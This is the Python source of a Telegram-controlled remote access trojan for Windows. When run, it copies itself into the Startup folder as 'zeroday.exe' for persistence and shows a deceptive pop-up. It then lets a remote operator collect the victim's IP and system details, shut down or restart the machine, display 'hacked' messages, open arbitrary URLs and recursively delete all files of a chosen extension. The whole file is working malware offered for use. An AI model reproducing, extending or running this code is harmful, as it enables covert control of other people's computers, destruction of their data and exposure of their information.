from telegram import Update
from telegram.ext import CommandHandler
from telegram.ext import MessageHandler
from telegram.ext import filters
from telegram.ext import ContextTypes
from telegram.ext import ApplicationBuilder
from telegram import InlineKeyboardButton
from telegram import InlineKeyboardMarkup
from os import system
import pyttsx3
import subprocess
import requests
import platform
import getpass
import time



user = getpass.getuser()
cmd = (r'copy main.exe "C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\zeroday.exe"'.format(str(user)))
system(cmd)

system('echo msgbox("This program requires a connection to the global Internet. Please, if your Internet is blocked, first connect your filter breaker and then run the program.") > sms.vbs')
system('Start sms.vbs')
time.sleep(4)
system('del sms.vbs')

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ip = requests.get('https://api.ipify.org/').text
    text = f'Connected to target:{ip}'
    key = [
    [InlineKeyboardButton('telegram chanel', 'https://t.me/H_SarrAllah')]
    ]
    await context.bot.send_message(chat_id= update.effective_chat.id, text=text, reply_markup= InlineKeyboardMarkup(key))

async def sysinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = 'os ='+platform.uname()[0]+' '+platform.uname()[2]+" "+platform.architecture()[0]+'\n'
    data += 'node ='+platform.node()+'\n'
    data += 'User ='+platform.uname()[1]+'\n'
    data += 'system Type ='+platform.uname()[5]+'\n'
    await context.bot.send_message(chat_id= update.effective_chat.id, text=data)

async def sound(update: Update, context: ContextTypes.DEFAULT_TYPE):
    e = pyttsx3.init()
    e.setProperty('rate', 110)
    e.say('hacked by team saarr allah')
    e.runAndWait()
    await context.bot.send_message(chat_id= update.effective_chat.id, text="sound played of successfully!")

async def show_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    system('echo hacked by team SarrAllaH > hacked.txt')
    system('Start hacked.txt')
    system('echo msgbox("Hacked by team SarrAllaH") > hack.vbs')
    system('Start hack.vbs')
    time.sleep(5)
    system('del hack.vbs')
    system('del hacked.txt')
    await context.bot.send_message(chat_id= update.effective_chat.id, text="text Showed")

async def shatdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    system("shutdown /s /t 3")
    await context.bot.send_message(chat_id= update.effective_chat.id, text='system power Off')
    
async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    system('shutdown /r /t 3')
    await context.bot.send_message(chat_id= update.effective_chat.id, text='system target restarted!')
    
async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) == 0:
        await update.message.reply_text("Please provide a format after the command.")
        return
    format_file = context.args[0]
    system(f'del /S *.{format_file}')    
    await context.bot.send_message(chat_id= update.effective_chat.id, text=f'files {format_file} deleted!')

async def help_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help = ""
    help += "/start        => Connect to target\n"
    help += "/system_info  => system information\n"    
    help += "/sound        => call system\n"
    help += "/shutdown     => turn off system\n"
    help += "/restart      => restart system\n"
    help += "/note         => show text for target\n"
    help += "/delete       => delete target data\n"
    help += "/help         => help\n"
    help += "/html         => open url\n"
    help += "/close        => close app\n"
    help += "/run          => Run application! Coming son"
    pm = "for using at /delete command please next input command input format file: for example: /delete png"
    pm = "for using at /html command please next input command input url file: for example: /delete https://example.com"
    await context.bot.send_message(chat_id= update.effective_chat.id, text=help)
    await context.bot.send_message(chat_id= update.effective_chat.id, text=pm)
    await context.bot.send_message(chat_id= update.effective_chat.id, text=pm)
 
async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_message(chat_id= update.effective_chat.id, text= update.message.text)
 
async def html_web(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) == 0:
        await update.message.reply_text("Please provide a URL after the command.")
        return
    url = context.args[0]
    subprocess.run(f"powershell start-process  {url}")
    await context.bot.send_message(chat_id= update.effective_chat.id, text='URL opened with target system!')
  
async def close(update: Update, context: ContextTypes.DEFAULT_TYPE):
    system('taskkill /IM pink_telegram.exe /f')
    await context.bot.send_message(chat_id= update.effective_chat.id, text='application closed in system target!')
    
async def open_app(update: Update, context: ContextTypes.DEFAULT_TYPE):
    #command in cmd = dir /s /b C:\main.exe
    pass
 
    
if __name__ == '__main__':
    app = ApplicationBuilder().token('TOKEN').build()
    
    start_command = CommandHandler('start', start)
    sysinfo_command = CommandHandler('system_info', sysinfo)
    sound_command = CommandHandler('sound', sound)
    text_command = CommandHandler('note', show_text)
    shatdown_command = CommandHandler('shutdown', shatdown)
    restart_command = CommandHandler('restart', restart)
    del_command = CommandHandler('delete', delete)
    help_cmmand = CommandHandler('help', help_list)
    echo_handler = MessageHandler(filters.TEXT &(~filters.COMMAND), echo)
    html_command = CommandHandler('html', html_web)
    close_command = CommandHandler('close', close)
    open_command = CommandHandler('run', open_app)
    
    app.add_handler(start_command)
    app.add_handler(sysinfo_command)
    app.add_handler(sound_command)
    app.add_handler(text_command)
    app.add_handler(shatdown_command)
    app.add_handler(restart_command)
    app.add_handler(del_command)
    app.add_handler(help_cmmand)
    app.add_handler(echo_handler)
    app.add_handler(html_command)
    app.add_handler(close_command)
    app.add_handler(open_command)
    
    app.run_polling()
